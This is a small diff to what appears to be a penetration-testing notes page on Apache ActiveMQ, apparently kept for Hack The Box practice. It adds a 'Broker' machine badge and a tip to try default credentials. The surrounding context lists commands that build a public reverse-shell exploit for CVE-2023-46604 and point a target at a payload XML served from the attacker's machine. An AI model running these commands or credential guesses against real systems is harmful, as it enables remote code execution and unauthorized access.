@@ -31,6 +31,8 @@ It's commonly used when we need to connect applications that are using different
 
 * [CVE-2023-46604](https://nvd.nist.gov/vuln/detail/CVE-2023-46604): vulnerability in ActiveMQ OpenWire Transport leading to remote code execution
 
+[![broker](../../../cybersecurity/_badges/htb-p/broker.svg)](https://app.hackthebox.com/machines/Broker)
+
 ```shell!
 
 $ git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git cve-2023-46604
@@ -41,5 +43,7 @@ $ go build
 $ python -m http.server 8001 # in another terminal
 $ ./ActiveMQ-RCE -i <target_ip> -u http://<your_IP>:8001/poc-linux.xml
 ```
+
+* Test default credentials (`admin:admin`, `user:user`)
 </div><div>
 </div></div>
